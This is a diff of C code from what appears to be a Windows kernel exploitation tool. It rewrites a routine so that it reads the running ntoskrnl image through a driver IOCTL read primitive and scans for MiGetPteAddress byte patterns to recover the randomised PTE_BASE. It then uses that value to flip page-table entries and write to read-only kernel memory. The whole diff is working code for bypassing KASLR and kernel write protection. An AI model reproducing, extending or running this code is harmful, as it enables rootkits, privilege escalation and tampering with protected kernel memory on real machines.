@@ -1750,63 +1750,122 @@ static BOOL KM_IsCanonicalKernelVa(ULONG64 va) {
 }
 
 /*
- * Scan the user-mode loaded ntoskrnl.exe image for the MiGetPteAddress pattern to
- * recover PTE_BASE without any kernel reads (no BSOD risk).
+ * Scan the RUNNING ntoskrnl kernel image (read via case 0x33) for the MiGetPteAddress
+ * byte pattern to recover the KASLR'd PTE_BASE at runtime.
  *
- * Win10 1803+ x64 MiGetPteAddress pattern:
- *   48 C1 F9 09             sar  rcx, 9
- *   48 B8 F8 FF FF FF FF    mov  rax, 0x7FFFFFFFF8   (mask, may vary)
- *        7F 00 00
- *   48 23 C8                and  rcx, rax
- *   48 B8 xx xx xx xx       mov  rax, <PTE_BASE>     <- extract this
- *        xx xx xx xx
- *   48 03 C1                add  rax, rcx
- *   C3                      ret
+ * Why the running image, not the on-disk file:
+ *   PTE_BASE is chosen randomly at each boot and patched into kernel code/data.
+ *   The ntoskrnl.exe PE file on disk holds placeholder zeros; only the live kernel
+ *   has the actual value.
  *
- * Strategy: find `sar rcx, 9` (48 C1 F9 09), then within 80 bytes scan for
- * MOV RAX, imm64 (48 B8) whose payload is a canonical kernel address aligned to 8 bytes.
- * Skip the mask value (0x7FFFFFFFF8) by checking that candidate >> 47 == 0x1FFFF.
+ * Two compiler variants handled:
+ *   A) REX.W MOV Reg, imm64  — PTE_BASE embedded as an 8-byte immediate after boot-patch
+ *        48/49 B8..BF  xx xx xx xx xx xx xx xx
+ *   B) REX.W ADD Rn, [RIP+disp32] — PTE_BASE in a .data slot; follow the RIP reference
+ *        48/4C 03 /r (mod=00 rm=101)  xx xx xx xx
+ *
+ * Anchor: 48 C1 F9 09  (sar rcx, 9) — opening instruction of every known
+ * MiGetPteAddress implementation on x64 Windows 10 1803 through 11 24H2.
+ *
+ * Safety: only non-discardable executable sections are scanned (skips freed INIT
+ * and pageable PAGE* sections that might fault via case 0x33).
  */
-static ULONG64 KM_ScanUserModeForPteBase(void) {
-    HMODULE kernel = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
-    if (!kernel) return 0;
+static ULONG64 KM_ScanKernelImageForPteBase(void) {
+    ULONG64 kbase = (ULONG64)g_KernelBase;
+    if (!kbase) return 0;
 
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)kernel;
-    PIMAGE_NT_HEADERS64 nt  = (PIMAGE_NT_HEADERS64)((BYTE*)kernel + dos->e_lfanew);
+    BYTE hdr[0x1000];
+    if (!KM_ReadKernelMemory(kbase, hdr, sizeof(hdr))) return 0;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > sizeof(hdr)) return 0;
+
+    PIMAGE_NT_HEADERS64 nt  = (PIMAGE_NT_HEADERS64)(hdr + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
+
     PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    WORD   nsec   = nt->FileHeader.NumberOfSections;
     ULONG64 pteBase = 0;
+
+    const DWORD CHUNK   = 0x8000;   /* 32 KB read per IOCTL */
+    const DWORD OVERLAP = 96;       /* back-up to catch cross-boundary patterns */
+    BYTE* buf = (BYTE*)malloc(CHUNK);
+    if (!buf) return 0;
+
     WORD i;
+    for (i = 0; i < nsec && !pteBase; i++) {
+        DWORD chars = sec[i].Characteristics;
+        if (!(chars & IMAGE_SCN_MEM_EXECUTE))    continue; /* not code */
+        if (chars & IMAGE_SCN_MEM_DISCARDABLE)   continue; /* freed INIT */
+        /* Skip PAGE* sections (pageable, might not be resident) */
+        if (strncmp((char*)sec[i].Name, "PAGE", 4) == 0) continue;
 
-    for (i = 0; i < nt->FileHeader.NumberOfSections && !pteBase; i++) {
-        if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
-        BYTE*  start = (BYTE*)kernel + sec[i].VirtualAddress;
-        DWORD  vsize = sec[i].Misc.VirtualSize;
-        DWORD  j;
+        ULONG64 secVA   = kbase + sec[i].VirtualAddress;
+        DWORD   secSize = sec[i].Misc.VirtualSize;
+        if (secSize > 0x1400000) secSize = 0x1400000; /* 20 MB cap */
 
-        for (j = 0; j + 14 < vsize && !pteBase; j++) {
-            /* sar rcx, 9 */
-            if (start[j] != 0x48 || start[j+1] != 0xC1 ||
-                start[j+2] != 0xF9 || start[j+3] != 0x09)
+        DWORD off = 0;
+        while (off < secSize && !pteBase) {
+            DWORD rdSz = secSize - off;
+            if (rdSz > CHUNK) rdSz = CHUNK;
+
+            if (!KM_ReadKernelMemory(secVA + off, buf, rdSz)) {
+                off += rdSz;
                 continue;
-
-            DWORD k;
-            for (k = j + 4; k + 10 <= j + 80 && k + 10 <= vsize; k++) {
-                if (start[k] != 0x48 || start[k+1] != 0xB8) continue;
-                ULONG64 candidate = 0;
-                memcpy(&candidate, &start[k+2], 8);
-                /* Top 17 bits all 1 = canonical kernel, low 3 bits 0 = aligned */
-                if ((candidate >> 47) != 0x1FFFF) continue;
-                if (candidate & 0x7ULL)            continue;
-                /* Skip the 0x7FFFFFFFF8 mask that also appears near sar rcx,9 */
-                if (candidate == 0x7FFFFFFFF8ULL)  continue;
-                if (candidate < 0xFFFF800000000000ULL) continue;
-                pteBase = candidate;
-                break;
             }
+
+            DWORD j;
+            for (j = 0; j + 4 <= rdSz && !pteBase; j++) {
+                /* anchor: sar rcx, 9 */
+                if (buf[j] != 0x48 || buf[j+1] != 0xC1 ||
+                    buf[j+2] != 0xF9 || buf[j+3] != 0x09)
+                    continue;
+
+                DWORD klim = j + 80;
+                if (klim > rdSz) klim = rdSz;
+                DWORD k;
+                for (k = j + 4; k < klim && !pteBase; k++) {
+                    BYTE b0 = buf[k], b1 = (k+1 < rdSz ? buf[k+1] : 0);
+
+                    /* Variant A: REX.W MOV Reg, imm64  (10 bytes) */
+                    if (k + 10 <= rdSz &&
+                        (b0 == 0x48 || b0 == 0x49) && b1 >= 0xB8 && b1 <= 0xBF) {
+                        ULONG64 cand = 0;
+                        memcpy(&cand, &buf[k+2], 8);
+                        if ((cand >> 47) == 0x1FFFF && !(cand & 7) &&
+                            cand != 0x7FFFFFFFF8ULL &&
+                            cand >= 0xFFFF800000000000ULL)
+                            pteBase = cand;
+                        continue;
+                    }
+
+                    /* Variant B: REX.W ADD Rn, [RIP+disp32]  (7 bytes)
+                       Encoding: (48|4C) 03 ModRM disp32  where ModRM & 0xC7 == 0x05 */
+                    if (k + 7 <= rdSz &&
+                        (b0 == 0x48 || b0 == 0x4C) && b1 == 0x03 &&
+                        (k+2 < rdSz) && ((buf[k+2] & 0xC7) == 0x05)) {
+                        INT32 disp32 = 0;
+                        memcpy(&disp32, &buf[k+3], 4);
+                        ULONG64 instrVA = secVA + off + k;
+                        ULONG64 targetVA = (ULONG64)((LONG64)(instrVA + 7) + disp32);
+                        if (KM_IsCanonicalKernelVa(targetVA)) {
+                            ULONG64 cand = 0;
+                            if (KM_ReadKernelMemory(targetVA, &cand, 8) &&
+                                (cand >> 47) == 0x1FFFF && !(cand & 7) &&
+                                cand >= 0xFFFF800000000000ULL)
+                                pteBase = cand;
+                        }
+                    }
+                }
+            }
+
+            /* advance with overlap so patterns crossing chunk boundary aren't missed */
+            off += (rdSz > OVERLAP) ? (rdSz - OVERLAP) : rdSz;
         }
     }
 
-    FreeLibrary(kernel);
+    free(buf);
     return pteBase;
 }
 
@@ -1962,28 +2021,28 @@ BOOL KM_WriteToReadOnlyMemory(ULONG64 kernelAddr, PVOID buffer, SIZE_T size) {
     } else
         DbgLog("  WriteToReadOnly: no verified CR3 from MZ test — trying kernel VA PTE flip");
 
-    /* --- Safe path: extract PTE_BASE from user-mode ntoskrnl scan (zero kernel reads) --- */
+    /* --- Safe path: scan the running ntoskrnl image for MiGetPteAddress to get PTE_BASE --- */
     {
-        ULONG64 pteBase = KM_ScanUserModeForPteBase();
+        ULONG64 pteBase = KM_ScanKernelImageForPteBase();
         if (pteBase) {
-            /* Validate by reading the PTE for the kernel base — always present when PTE_BASE is correct. */
+            /* Validate: PTE for g_KernelBase must be present (bit 0) when PTE_BASE is correct */
             ULONG64 kbasePte = pteBase + (((LONG64)(ULONG64)g_KernelBase >> 9) & 0x7FFFFFFFF8);
             ULONG64 kbasePteVal = 0;
             BOOL valid = KM_IsCanonicalKernelVa(kbasePte) &&
                          KM_ReadKernelMemory(kbasePte, &kbasePteVal, sizeof(kbasePteVal)) &&
                          (kbasePteVal & 1);
             if (valid) {
-                DbgLog("  WriteToReadOnly: PTE_BASE=0x%llX (user-mode scan, kbasePTE=0x%llX val=0x%llX)",
+                DbgLog("  WriteToReadOnly: PTE_BASE=0x%llX (kernel scan, kbasePTE=0x%llX val=0x%llX)",
                     pteBase, kbasePte, kbasePteVal);
                 if (KM_TryKernelVaWritableFlip(pteBase, kernelAddr, buffer, size))
                     return TRUE;
-                DbgLog("  WriteToReadOnly: user-mode PTE_BASE flip attempt inconclusive, continuing");
+                DbgLog("  WriteToReadOnly: kernel PTE_BASE flip inconclusive, continuing");
             } else {
                 DbgLog("  WriteToReadOnly: PTE_BASE=0x%llX failed validation (kbasePte=0x%llX val=0x%llX)",
                     pteBase, kbasePte, kbasePteVal);
             }
         } else {
-            DbgLog("  WriteToReadOnly: user-mode PTE_BASE scan found no match");
+            DbgLog("  WriteToReadOnly: kernel image PTE_BASE scan found no match");
         }
     }
 
